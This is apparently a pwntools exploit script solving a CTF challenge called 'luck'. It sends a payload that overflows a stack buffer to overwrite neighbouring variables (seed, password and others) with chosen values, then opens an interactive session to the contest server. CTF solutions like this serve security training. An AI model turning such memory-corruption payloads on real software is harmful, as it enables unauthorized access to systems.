from pwn import *

local = False
if local:
    r = process('./luck')
else:
    r = remote('ctf.adl.csie.ncu.edu.tw', 11002)

# a: rbp-0x18
# input: rbp-0x14
# seed: rbp-0x10
# b: rbp-0xc
# c: rbp-0x8
# password: rbp-0x4
payload = flat(['aaaa', 0xcccccccc, 0x11111111, 0xfaceb00c, 0xdeadbeef, 0xcccccccc])

# raw_input('pause')
r.sendline(payload)
r.interactive()
